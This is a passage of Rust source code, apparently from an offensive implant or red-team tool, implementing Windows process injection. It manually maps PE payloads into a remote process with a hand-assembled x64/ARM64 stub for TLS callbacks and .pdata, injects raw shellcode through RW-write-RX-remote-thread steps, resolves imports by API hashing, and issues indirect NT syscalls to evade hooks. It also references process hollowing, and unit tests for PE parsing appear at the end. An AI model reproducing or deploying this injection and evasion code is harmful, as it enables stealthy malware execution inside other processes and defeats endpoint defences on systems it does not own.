                        stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1
                        stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d
                        stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, cb_va
                        stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                    }

                    // ABI epilogue.
                    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20

                    // Set up DllMain arguments and jump to entry point.
                    let ep_va = (remote_base + ep_rva) as u64;
                    stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
                    stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                    stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
                    stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved=NULL)
                    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, ep_va
                    stub.extend_from_slice(&ep_va.to_le_bytes());
                    stub.extend_from_slice(&[0xFF, 0xE0]); // jmp rax
                }

                #[cfg(target_arch = "aarch64")]
                {
                    // .pdata registration.
                    if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                        push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
                        push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
                        push_arm64_mov_imm64(&mut stub, 2, remote_base as u64);
                        push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
                        push_arm64_blr(&mut stub, 16);
                    }

                    // TLS callback invocations.
                    for &cb_va in &tls_callback_vas {
                        push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base as u64);
                    }

                    // Set up DllMain args and jump to entry point.
                    let ep_va = (remote_base + ep_rva) as u64;
                    push_arm64_mov_imm64(&mut stub, 0, remote_base as u64); // x0 = hinstDLL
                    push_arm64_mov_imm64(&mut stub, 1, 1); // x1 = DLL_PROCESS_ATTACH
                    push_arm64_mov_imm64(&mut stub, 2, 0); // x2 = NULL
                    push_arm64_mov_imm64(&mut stub, 16, ep_va); // x16 = entry
                    push_arm64_br(&mut stub, 16);
                }

                // Allocate RW memory for the stub.
                let mut stub_mem: *mut c_void = std::ptr::null_mut();
                let mut stub_alloc_size = stub.len();
                let alloc_s = nt_syscall::syscall!(
                    "NtAllocateVirtualMemory",
                    hprocess as u64,
                    &mut stub_mem as *mut _ as u64,
                    0u64,
                    &mut stub_alloc_size as *mut _ as u64,
                    (MEM_COMMIT | MEM_RESERVE) as u64,
                    PAGE_READWRITE as u64,
                );
                if alloc_s.as_ref().map_or(true, |s| *s < 0) || stub_mem.is_null() {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: NtAllocateVirtualMemory for TLS/pdata stub failed: {:?}",
                        alloc_s
                    ));
                }

                // Write the stub bytes.
                let mut stub_written = 0usize;
                let write_s = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64,
                    stub_mem as u64,
                    stub.as_ptr() as u64,
                    stub.len() as u64,
                    &mut stub_written as *mut _ as u64,
                );
                if write_s.as_ref().map_or(true, |s| *s < 0) || stub_written != stub.len() {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: NtWriteVirtualMemory for TLS/pdata stub failed: status={:?}, wrote={}, expected={}",
                        write_s, stub_written, stub.len()
                    ));
                }

                // Make stub executable (RX).
                let mut prot_base = stub_mem;
                let mut prot_size = stub.len();
                let mut old_prot = 0u32;
                let prot_s = nt_syscall::syscall!(
                    "NtProtectVirtualMemory",
                    hprocess as u64,
                    &mut prot_base as *mut _ as u64,
                    &mut prot_size as *mut _ as u64,
                    PAGE_EXECUTE_READ as u64,
                    &mut old_prot as *mut _ as u64,
                );
                if prot_s.as_ref().map_or(true, |s| *s < 0) {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: NtProtectVirtualMemory(RX) for stub failed: {:?}",
                        prot_s
                    ));
                }

                // Flush I-cache for the stub.
                let _ = nt_syscall::syscall!(
                    "NtFlushInstructionCache",
                    hprocess as u64,
                    stub_mem as u64,
                    stub.len() as u64,
                );

                tracing::debug!(
                    "inject_into_process: injected TLS/pdata stub at {:p} ({} TLS callbacks, .pdata={} entries)",
                    stub_mem,
                    tls_callback_vas.len(),
                    pdata_count,
                );

                stub_mem as usize
            } else {
                // No TLS callbacks and no .pdata — start directly at entry point.
                remote_base + ep_rva
            };

            let mut h_thread: *mut c_void = null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                NT_THREAD_INJECT_ACCESS,
                null_mut(),
                hprocess,
                entry_va as *mut c_void,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(pid={}) failed: {:x}",
                    pid,
                    status
                ));
            }
            created_thread = if keep_handles {
                Some(h_thread)
            } else {
                close_h!(h_thread);
                None
            };
        } else {
            // Shellcode injection — allocate RW, write, protect RX, then thread
            // P0-13: NtAllocateVirtualMemory indirect syscall.
            let mut remote_base_val: usize = 0;
            let mut alloc_size = payload.len();
            let alloc_status = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                hprocess as u64,
                &mut remote_base_val as *mut _ as u64,
                0u64,
                &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64,
                PAGE_READWRITE as u64,
            );
            if alloc_status.map_or(true, |s| s < 0) || remote_base_val == 0 {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtAllocateVirtualMemory(shellcode, pid={}) failed",
                    pid
                ));
            }
            let remote_mem = remote_base_val as *mut c_void;
            injected_base_addr = remote_base_val;
            let mut written: usize = 0;
            // P0-13: NtWriteVirtualMemory for shellcode.
            let shellcode_write_status = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                hprocess as u64,
                remote_mem as u64,
                payload.as_ptr() as u64,
                payload.len() as u64,
                &mut written as *mut _ as u64,
            );
            if shellcode_write_status.as_ref().map_or(true, |s| *s < 0) || written != payload.len()
            {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtWriteVirtualMemory(shellcode, pid={}) failed: status={:?}, wrote={}, expected={}",
                    pid,
                    shellcode_write_status,
                    written,
                    payload.len()
                ));
            }
            // P0-13: NtProtectVirtualMemory to RX.
            let mut old_prot = 0u32;
            let mut prot_base = remote_base_val;
            let mut prot_size = payload.len();
            let protect_status = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                hprocess as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64,
                &mut old_prot as *mut _ as u64,
            );
            if protect_status.as_ref().map_or(true, |s| *s < 0) {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtProtectVirtualMemory(shellcode, pid={}) failed: {:?}",
                    pid,
                    protect_status
                ));
            }
            // Flush I-cache before redirecting execution into the newly-written
            // shellcode (L-04 fix).
            // P0-13: NtFlushInstructionCache indirect syscall.
            let _ = nt_syscall::syscall!(
                "NtFlushInstructionCache",
                hprocess as u64,
                remote_mem as u64,
                payload.len() as u64,
            );
            let mut h_sc_thread: *mut c_void = null_mut();
            let sc_status = nt_create_thread(
                &mut h_sc_thread,
                NT_THREAD_INJECT_ACCESS,
                null_mut(),
                hprocess,
                remote_mem,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if sc_status < 0 || h_sc_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(shellcode, pid={}) failed: {:x}",
                    pid,
                    sc_status
                ));
            }
            created_thread = if keep_handles {
                Some(h_sc_thread)
            } else {
                close_h!(h_sc_thread);
                None
            };
        }

        let process_handle = if keep_handles {
            hprocess
        } else {
            close_h!(hprocess);
            null_mut()
        };

        Ok(InjectedProcess {
            target_pid: pid,
            remote_base: injected_base_addr,
            payload_size: payload.len(),
            process_handle,
            thread_handle: created_thread,
        })
    }
}

/// Resolve each imported function in the payload's IAT and write addresses into
/// the remote process (2.2).
///
/// Import resolution is done module-relative (RVA) and then remapped onto the
/// *remote* module base so correctness does not depend on local/remote module
/// base equality.
#[cfg(windows)]
unsafe fn fix_iat_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
    payload: &[u8],
    written: &mut usize,
) -> Result<()> {
    use std::collections::HashMap;

    // Resolve LdrLoadDll address for the remote-DLL-load path.
    let ntdll_base =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
    let ldr_load_dll_addr = if ntdll_base != 0 {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"LdrLoadDll\0"))
    } else {
        None
    };

    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let mut local_modules: HashMap<String, usize> = HashMap::new();
    let mut remote_modules: HashMap<String, usize> = HashMap::new();

    // Convert import-directory RVA to file offset.  Each field in the import
    // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
    // must be converted before using it as a payload index.
    let mut unresolved_count: usize = 0;
    let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
    loop {
        if desc_off + 20 > payload.len() {
            break;
        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        // Convert all three RVAs to file offsets.
        let name_off = rva_to_file_offset(name_rva, nt);
        let first_thunk_off = rva_to_file_offset(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };

        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };
        let dll_name_norm = normalize_dll_name(dll_name_str);

        let dll_base = ensure_local_module_loaded_cached(&mut local_modules, &dll_name_norm)
            .ok_or_else(|| {
                anyhow!(
                    "fix_iat_remote: could not find/load local dependency {}",
                    dll_name_norm
                )
            })?;

        // Ensure the dependency is present in the target process and cache its
        // actual remote base.  IAT entries are written relative to this base.
        let _remote_dll_base = ensure_remote_module_loaded_cached(
            hprocess,
            &dll_name_norm,
            ldr_load_dll_addr,
            &mut remote_modules,
        )?;

        let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
                                           // Track the IAT position as an RVA, not a file offset.  The remote process
                                           // maps PE sections at their virtual addresses (RVAs relative to image base),
                                           // so writes to the remote IAT must target `remote_base + IAT_RVA`, NOT
                                           // `remote_base + file_offset`.  The two values differ whenever the .idata
                                           // section has `PointerToRawData != VirtualAddress` (the common case for any
                                           // PE with a non-trivial section layout).
        let mut iat_rva = first_thunk_rva; // RVA for remote IAT write targets
        loop {
            if thunk_off + 8 > payload.len() {
                break;
            }
            let thunk_val =
                u64::from_le_bytes(payload[thunk_off..thunk_off + 8].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let resolved = if thunk_val & (1u64 << 63) != 0 {
                // Ordinal import: resolve to owning module + export RVA.
                let ord = (thunk_val & 0xFFFF) as u32;
                let r = local_resolve_export_target_by_ordinal(
                    &dll_name_norm,
                    dll_base,
                    ord,
                    &mut local_modules,
                    0,
                );
                if r.is_none() {
                    tracing::warn!(
                        "fix_iat_remote: ordinal {} in {} unresolved",
                        ord,
                        dll_name_norm
                    );
                }
                r
            } else {
                // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
                let ibn_off = rva_to_file_offset(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 8;
                    iat_rva += 8;
                    continue;
                }
                let name_start = ibn_off + 2; // skip 2-byte Hint
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let mut name_null = name_bytes[..nlen].to_vec();
                name_null.push(0);
                let hash = pe_resolve::hash_str(&name_null);
                let r = local_resolve_export_target_by_hash(
                    &dll_name_norm,
                    dll_base,
                    hash,
                    &mut local_modules,
                    0,
                );
                if r.is_none() {
                    tracing::warn!(
                        "fix_iat_remote: {}!{} unresolved via export walk",
                        dll_name_norm,
                        String::from_utf8_lossy(&name_null[..name_null.len().saturating_sub(1)])
                    );
                }
                r
            };

            let func_addr: usize =
                if let Some((owner_module, _owner_local_base, func_rva)) = resolved {
                    let owner_remote_base = ensure_remote_module_loaded_cached(
                        hprocess,
                        &owner_module,
                        ldr_load_dll_addr,
                        &mut remote_modules,
                    )?;

                    match owner_remote_base.checked_add(func_rva) {
                        Some(v) => v,
                        None => {
                            tracing::warn!(
                                "fix_iat_remote: address overflow for {} (base={:#x}, rva={:#x})",
                                owner_module,
                                owner_remote_base,
                                func_rva
                            );
                            unresolved_count += 1;
                            0
                        }
                    }
                } else {
                    unresolved_count += 1;
                    0
                };

            if func_addr != 0 {
                // Write the resolved address into the remote IAT entry.  Use the
                // RVA (not the file offset) to compute the remote target address.
                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                let iat_write_status = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64,
                    iat_remote as u64,
                    &func_addr as *const _ as u64,
                    8u64,
                    written as *mut _ as u64,
                );
                if iat_write_status.as_ref().map_or(true, |s| *s < 0) {
                    tracing::warn!(
                        "fix_iat_remote: NtWriteVirtualMemory IAT write failed at RVA {:#x} (status={:?})",
                        iat_rva,
                        iat_write_status
                    );
                    unresolved_count += 1;
                }
            }
            thunk_off += 8;
            iat_rva += 8;
        }
        desc_off += 20;
    }
    if unresolved_count > 0 {
        return Err(anyhow::anyhow!(
            "fix_iat_remote: {} import(s) could not be resolved — payload would crash at runtime",
            unresolved_count
        ));
    }
    Ok(())
}

/// Apply per-section memory protections after the payload has been written (2.4).
/// Sections with the execute flag get PAGE_EXECUTE_READ; writable-only get
/// PAGE_READWRITE; everything else gets PAGE_READONLY.
#[cfg(windows)]
unsafe fn apply_section_protections(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
) {
    use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64>())
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true) => PAGE_EXECUTE_READ, // downgrade W+X
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (sec.Misc.VirtualSize as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 {
            continue;
        }
        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut sz = virt_size;
        let mut old = 0u32;
        let status = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            hprocess as u64,
            &mut addr as *mut _ as u64,
            &mut sz as *mut _ as u64,
            protect as u64,
            &mut old as *mut _ as u64,
        );
        if status.as_ref().map_or(true, |s| *s < 0) {
            tracing::warn!(
                "apply_section_protections: NtProtectVirtualMemory(section={:?}, base={:#x}, size={:#x}) failed: {:?}",
                &sec.Name,
                addr as usize,
                virt_size,
                status
            );
        }
    }
}

#[cfg(not(windows))]
pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("hollow_and_execute is only available on Windows"))
}

#[cfg(not(windows))]
pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
    Err(anyhow!("inject_into_process is only available on Windows"))
}

#[cfg(not(windows))]
pub fn inject_into_process_with_info(_pid: u32, _payload: &[u8]) -> Result<InjectedProcess> {
    Err(anyhow!(
        "inject_into_process_with_info is only available on Windows"
    ))
}

// ──────────────────────────────────────────────────────────────────────────────
// Unit tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::{checked_pe_lfanew, rva_to_file_offset_sections, SectionDesc};

    /// Build a synthetic section table where raw offsets and virtual addresses
    /// deliberately differ so a naive RVA-as-file-offset would be wrong.
    ///
    /// Layout:
    ///  .text  VA=0x1000  VS=0x200  raw=0x400   (raw ≠ VA)
    ///  .data  VA=0x2000  VS=0x100  raw=0x600   (raw ≠ VA)
    ///  .idata VA=0x3000  VS=0x080  raw=0x700   (IAT section)
    fn synthetic_sections() -> Vec<SectionDesc> {
        vec![
            SectionDesc {
                virtual_address: 0x1000,
                virtual_size: 0x200,
                raw_offset: 0x400,
            },
            SectionDesc {
                virtual_address: 0x2000,
                virtual_size: 0x100,
                raw_offset: 0x600,
            },
            SectionDesc {
                virtual_address: 0x3000,
                virtual_size: 0x080,
                raw_offset: 0x700,
            },
        ]
    }

    #[test]
    fn rva_in_text_section_maps_to_correct_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x1050 is 0x50 bytes into .text (VA=0x1000, raw=0x400).
        // Expected file offset: 0x400 + 0x50 = 0x450.
        assert_eq!(rva_to_file_offset_sections(0x1050, &secs), 0x450);
    }

    #[test]
    fn rva_in_idata_section_maps_to_iat_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x3010 is 0x10 bytes into .idata (VA=0x3000, raw=0x700).
        // Expected: 0x700 + 0x10 = 0x710.
        // A naive RVA-as-file-offset would give 0x3010 — wrong.
        assert_eq!(rva_to_file_offset_sections(0x3010, &secs), 0x710);
    }

    #[test]
    fn rva_in_header_area_falls_back_to_identity() {
        let secs = synthetic_sections();
        // RVA below first section VA is in the PE header; maps 1:1.
        assert_eq!(rva_to_file_offset_sections(0x100, &secs), 0x100);
    }

    #[test]
    fn rva_exactly_at_section_start() {
        let secs = synthetic_sections();
        // RVA 0x2000 is exactly the start of .data (raw=0x600).
        assert_eq!(rva_to_file_offset_sections(0x2000, &secs), 0x600);
    }

    #[test]
    fn rva_one_past_section_end_falls_back() {
        let secs = synthetic_sections();
        // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
        // so it should fall through to the identity fallback.
        assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
    }

    #[test]
    fn checked_pe_lfanew_rejects_negative_offset() {
        let mut payload = vec![0u8; 0x80];
        payload[0] = b'M';
        payload[1] = b'Z';
        payload[0x3c..0x40].copy_from_slice(&(-4i32).to_le_bytes());

        let err = checked_pe_lfanew(&payload).unwrap_err().to_string();
        assert!(err.contains("negative e_lfanew"));
    }

    #[test]
    fn checked_pe_lfanew_rejects_out_of_bounds_offset() {
        let mut payload = vec![0u8; 0x80];
        payload[0] = b'M';
        payload[1] = b'Z';
        payload[0x3c..0x40].copy_from_slice(&(0x1000i32).to_le_bytes());

        let err = checked_pe_lfanew(&payload).unwrap_err().to_string();
        assert!(err.contains("NT signature"));
    }

    #[cfg(windows)]
    #[test]
    #[ignore] // Manual Windows test: requires an explicit 32-bit payload path.
    fn hollow_and_execute_pe32_payload_succeeds() {
        use windows_sys::Win32::System::Diagnostics::Debug::{
            IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR32_MAGIC,
        };
        use windows_sys::Win32::System::SystemServices::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
        };

        let payload_path = std::env::var("HOLLOWING_PE32_PAYLOAD")
            .expect("set HOLLOWING_PE32_PAYLOAD to a valid 32-bit PE payload path");
        let payload = std::fs::read(&payload_path).unwrap_or_else(|e| {
            panic!("failed to read HOLLOWING_PE32_PAYLOAD={payload_path}: {e}")
        });

        assert!(payload.len() >= 0x40, "PE32 payload too small");
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        unsafe {
            assert_eq!((*dos).e_magic, IMAGE_DOS_SIGNATURE, "invalid DOS signature");
            let e_lfanew = (*dos).e_lfanew as usize;
            let sig_off = e_lfanew;
            assert!(sig_off + 4 <= payload.len(), "missing NT signature");
            let sig = u32::from_le_bytes(payload[sig_off..sig_off + 4].try_into().unwrap());
            assert_eq!(sig, IMAGE_NT_SIGNATURE, "invalid NT signature");

            let magic_off = e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>();
            assert!(
                magic_off + 2 <= payload.len(),
                "missing OptionalHeader.Magic"
            );
            let magic = u16::from_le_bytes(payload[magic_off..magic_off + 2].try_into().unwrap());
            assert_eq!(
                magic, IMAGE_NT_OPTIONAL_HDR32_MAGIC,
                "payload is not PE32 (OptionalHeader.Magic={magic:#x})"
            );
        }

        super::hollow_and_execute(&payload).expect("PE32 hollowing succeeded");
    }

    #[test]
    fn non_windows_hollow_and_execute_returns_error() {
        #[cfg(not(windows))]
        {
            let result = super::hollow_and_execute(&[0x4d, 0x5a]);
            assert!(result.is_err());
            assert!(result.unwrap_err().to_string().contains("Windows"));
        }
    }
}
